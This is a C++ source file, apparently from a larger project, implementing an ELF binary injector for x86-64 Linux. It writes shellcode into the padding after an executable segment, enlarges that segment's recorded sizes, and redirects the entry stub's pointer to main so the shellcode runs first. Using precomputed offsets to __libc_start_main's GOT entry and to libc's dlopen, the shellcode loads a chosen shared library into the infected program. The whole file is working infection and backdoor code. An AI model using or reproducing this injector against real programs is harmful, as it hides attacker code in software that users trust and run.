#include "Injector.h"
#include <cstring>
#include <string_view>


constexpr unsigned long OFFSET_TO_MAIN_PTR_FROM_START = 27;
constexpr unsigned long MAIN_PTR_SIZE = 4;
constexpr std::string_view LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6";

Injector::Injector(std::shared_ptr<MapGuard> file_to_inject, std::shared_ptr<MapGuard> shellcode_to_inject,
                   std::string so_name) :
        m_file(std::move(file_to_inject)),
        m_shellcode(std::move(shellcode_to_inject)),
        m_elf_parser(m_file),
        m_so_name(std::move(so_name)) {}


void Injector::inject() {
    auto elf_header = m_elf_parser.get_elf_header();
    auto elf_program_headers = m_elf_parser.get_program_headers();
    for (int i = 0; i < elf_header.e_phnum; ++i) {
        if (elf_program_headers.at(i).p_type != PT_LOAD || (elf_program_headers.at(i).p_flags & PF_X) == 0) {
            continue;
        }
        if (m_shellcode->get_file_size() > elf_program_headers.at(i).p_align - elf_program_headers.at(i).p_memsz) {
            throw std::runtime_error("The alignment is too small");
        }
        auto shellcode_args = get_shellcode_args(elf_program_headers.at(i));
        inject_shellcode_args_to_shellcode(shellcode_args);
        inject_shellcode_to_elf(m_shellcode->read_from_file(0, m_shellcode->get_file_size()),
                                elf_program_headers.at(i));
        edit_segment_size(elf_program_headers.at(i), elf_header.e_phoff + i * sizeof(Elf64_Phdr));
        uint32_t shellcode_offset_from_main_ptr = get_offset_to_shellcode(elf_program_headers.at(i));
        edit_main_offset_parameter(shellcode_offset_from_main_ptr);

        break;
    }
}

ShellcodeArgs Injector::get_shellcode_args(const Elf64_Phdr &segment_to_edit) const {
    ShellcodeArgs args = {0};
    auto elf_header = m_elf_parser.get_elf_header();

    auto real_main_offset = m_file->read_from_file(elf_header.e_entry + OFFSET_TO_MAIN_PTR_FROM_START,
                                                   sizeof(uint32_t));
    args.offset_to_real_main = reinterpret_cast<int *>(real_main_offset.data())[0];
    args.offset_to_real_main -= get_offset_to_shellcode(segment_to_edit);

    args.offset_to_got_libc_start_main = get_offset_to_got_libc_start_main_from_shellcode(segment_to_edit);

    ElfParser libc_elf_parser(LIBC_PATH);
    args.offset_from_libc_start_main_to_dlopen = static_cast<long>(libc_elf_parser.get_symbol_value("dlopen"));
    args.offset_from_libc_start_main_to_dlopen -= static_cast<long>(libc_elf_parser.get_symbol_value(
            "__libc_start_main"));

    std::memcpy(args.so_name, m_so_name.c_str(), m_so_name.size());

    return args;
}

long Injector::get_offset_to_got_libc_start_main_from_shellcode(const Elf64_Phdr &segment_to_edit) const {
    auto offset_to_got_libc_start_main_from_shellcode = static_cast<long>(m_elf_parser.get_offset_of_relocatable_symbol(
            "__libc_start_main"));
    offset_to_got_libc_start_main_from_shellcode -= static_cast<long>(segment_to_edit.p_vaddr);
    offset_to_got_libc_start_main_from_shellcode -= static_cast<long>(segment_to_edit.p_memsz);
    offset_to_got_libc_start_main_from_shellcode -= sizeof(ShellcodeArgs);
    return offset_to_got_libc_start_main_from_shellcode;
}

void Injector::inject_shellcode_args_to_shellcode(const ShellcodeArgs &args) {
    auto raw_data = reinterpret_cast<const char *>(&args);
    std::vector<char> shellcode_args_data(raw_data, raw_data + sizeof(ShellcodeArgs));

    m_shellcode->write_to_file(shellcode_args_data, 0);
}

void Injector::inject_shellcode_to_elf(const std::vector<char> &shellcode, const Elf64_Phdr &segment_to_edit) {
    auto offset_to_end_of_segment = segment_to_edit.p_offset + segment_to_edit.p_memsz;
    m_file->write_to_file(shellcode, offset_to_end_of_segment);
}

void Injector::edit_segment_size(const Elf64_Phdr &segment_to_edit, unsigned long offset_to_segment) {
    auto size_after_injection = segment_to_edit.p_filesz + m_shellcode->get_file_size();
    auto raw_data = reinterpret_cast<const char *>(&size_after_injection);
    std::vector<char> real_size_data(raw_data, raw_data + sizeof(segment_to_edit.p_filesz));
    auto offset_to_segment_size =
            offset_to_segment - (unsigned long) &segment_to_edit + (unsigned long) &segment_to_edit.p_filesz;
    m_file->write_to_file(real_size_data, offset_to_segment_size);
    auto offset_to_segment_mem_size =
            offset_to_segment - (unsigned long) &segment_to_edit + (unsigned long) &segment_to_edit.p_memsz;
    m_file->write_to_file(real_size_data, offset_to_segment_mem_size);
}

uint32_t Injector::get_offset_to_shellcode(const Elf64_Phdr &exec_segment) const {
    auto elf_header = m_elf_parser.get_elf_header();
    uint32_t shellcode_offset_from_main_ptr = exec_segment.p_memsz;
    shellcode_offset_from_main_ptr += exec_segment.p_offset;
    shellcode_offset_from_main_ptr += sizeof(ShellcodeArgs);
    shellcode_offset_from_main_ptr -= elf_header.e_entry;
    shellcode_offset_from_main_ptr -= OFFSET_TO_MAIN_PTR_FROM_START;
    shellcode_offset_from_main_ptr -= MAIN_PTR_SIZE;

    return shellcode_offset_from_main_ptr;

}

void Injector::edit_main_offset_parameter(uint32_t shellcode_offset_from_main_ptr) {
    auto elf_header = m_elf_parser.get_elf_header();
    auto offset_to_main_ptr = elf_header.e_entry + OFFSET_TO_MAIN_PTR_FROM_START;
    auto raw_data = reinterpret_cast<const char *>(&shellcode_offset_from_main_ptr);
    std::vector<char> shellcode_main_offset(raw_data, raw_data + sizeof(uint32_t));
    m_file->write_to_file(shellcode_main_offset, offset_to_main_ptr);

}

